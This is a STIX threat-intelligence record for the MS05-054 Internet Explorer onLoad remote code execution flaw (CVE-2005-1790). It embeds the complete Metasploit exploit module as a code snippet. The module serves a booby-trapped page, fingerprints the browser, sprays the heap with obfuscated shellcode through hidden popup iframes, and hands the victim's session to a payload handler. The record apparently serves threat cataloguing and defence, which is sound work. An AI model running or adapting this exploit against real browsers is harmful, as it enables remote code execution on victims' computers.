{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--caba926f-0195-4fbb-856e-f84d874402cb",
    "created": "2024-08-14T16:40:25.435025Z",
    "modified": "2024-08-14T16:40:25.435029Z",
    "name": "MS05-054 Microsoft Internet Explorer JavaScript OnLoad Handler Remote Code Execution",
    "description": " This bug is triggered when the browser handles a JavaScript 'onLoad' handler in conjunction with an improperly initialized 'window()' JavaScript function. This exploit results in a call to an address lower than the heap. The javascript prompt() places our shellcode near where the call operand points to.  We call prompt() multiple times in separate iframes to place our return address. We hide the prompts in a popup window behind the main window. We spray the heap a second time with our shellcode and point the return address to the heap. I use a fairly high address to make this exploit more reliable. IE will crash when the exploit completes.  Also, please note that Internet Explorer must allow popups in order to continue exploitation.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms05_054_onload.rb",
            "external_id": "ms05_054_onload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1790"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS05-054 Microsoft Internet Explorer JavaScript OnLoad Handler Remote Code Execution',\n      'Description'    => %q{\n        This bug is triggered when the browser handles a JavaScript 'onLoad' handler in\n        conjunction with an improperly initialized 'window()' JavaScript function.\n        This exploit results in a call to an address lower than the heap. The javascript\n        prompt() places our shellcode near where the call operand points to.  We call\n        prompt() multiple times in separate iframes to place our return address.\n        We hide the prompts in a popup window behind the main window. We spray the heap\n        a second time with our shellcode and point the return address to the heap. I use\n        a fairly high address to make this exploit more reliable. IE will crash when the\n        exploit completes.  Also, please note that Internet Explorer must allow popups\n        in order to continue exploitation.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Benjamin Tobias Franz', # Discovery\n          'Stuart Pearson',        # Proof of Concept\n          'Sam Sharps'             # Metasploit port\n        ],\n      'References'     =>\n        [\n          ['MSB', 'MS05-054'],\n          ['CVE', '2005-1790'],\n          ['OSVDB', '17094'],\n          ['BID', '13799']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'Compat'   =>\n            {\n              'ConnectionType' => '-find',\n            },\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Internet Explorer 6 on Windows XP', { 'iframes' => 4 } ],\n          [ 'Internet Explorer 6 Windows 2000',  { 'iframes' => 8 } ],\n        ],\n      'DisclosureDate' => '2005-11-21',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    @var_redir = rand_text_alpha(rand(100)+1)\n    super\n  end\n\n  def auto_target(cli, request)\n    mytarget = nil\n\n    agent = request.headers['User-Agent']\n    print_status(\"Checking user agent: #{agent}\")\n\n    if (agent =~ /MSIE 6\\.0/ && agent =~ /Windows NT 5\\.1/)\n      mytarget = targets[0]   # IE6 on XP\n    elsif (agent =~ /MSIE 6\\.0/ && agent =~ /Windows NT 5\\.0/)\n      mytarget = targets[1]\t# IE6 on 2000\n    else\n      print_error(\"Unknown User-Agent #{agent}\")\n    end\n\n    mytarget\n  end\n\n\n  def on_request_uri(cli, request)\n    mytarget   = auto_target(cli, request)\n    var_title  = rand_text_alpha(rand(100) + 1)\n    func_main  = rand_text_alpha(rand(100) + 1)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    heapspray = ::Rex::Exploitation::JSObfu.new %Q|\nfunction heapspray()\n{\n  shellcode = unescape('#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');\n  var #{randnop} = \"#{Rex::Text.to_unescape(make_nops(4))}\";\n  var bigblock = unescape(#{randnop});\n  var headersize = 20;\n  var slackspace = headersize + shellcode.length;\n  while (bigblock.length < slackspace) bigblock += bigblock;\n  var fillblock = bigblock.substring(0,slackspace);\n  var block = bigblock.substring(0,bigblock.length - slackspace);\n  while (block.length + slackspace < 0x40000) block = block + block + fillblock;\n  var memory = new Array();\n  for (i = 0; i < 250; i++){ memory[i] = block + shellcode }\n\n  var ret = \"\";\n  var fillmem = \"\";\n\n  for (i = 0; i < 500; i++)\n    ret += unescape(\"%u0F0F%u0F0F\");\n  for (i = 0; i < 200; i++)\n    fillmem += ret;\n\n  prompt(fillmem, \"\");\n}\n|\n    heapspray.obfuscate(memory_sensitive: true)\n\n    nofunc = ::Rex::Exploitation::JSObfu.new %Q|\n\nif (document.location.href.indexOf(\"#{@var_redir}\") == -1)\n{\n  var counter = 0;\n\n\n  top.consoleRef = open('','BlankWindow',\n  'width=100,height=100'\n  +',menubar=0'\n  +',toolbar=1'\n  +',status=0'\n  +',scrollbars=0'\n  +',left=1'\n  +',top=1'\n  +',resizable=1')\n  self.focus()\n\n\n  for (counter = 0; counter < #{mytarget['iframes']}; counter++)\n  {\n    top.consoleRef.document.writeln('<iframe width=1 height=1 src='+document.location.href+'?p=#{@var_redir}</iframe>');\n  }\n  document.writeln(\"<body onload=\\\\\"setTimeout('#{func_main}()',6000)\\\\\">\");\n\n}\nelse\n{\n  #{heapspray.sym('heapspray')}();\n}\n|\n\n    nofunc.obfuscate(memory_sensitive: true)\n\n    main = %Q|\nfunction #{func_main}()\n{\n  document.write(\"<TITLE>#{var_title}</TITLE>\");\n  document.write(\"<body onload=window();>\");\n\n  window.location.reload();\n}\n|\n\n    html = %Q|\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\">\n<html>\n<head>\n<meta http-equiv=\"Content-Language\" content=\"en-gb\">\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\">\n<script>\n#{nofunc}\n#{heapspray}\n#{main}\n</script>\n</head>\n<body>\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n    # Transmit the compressed response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-11-21",
    "x_mitre_platforms": [
        "win'"
    ]
}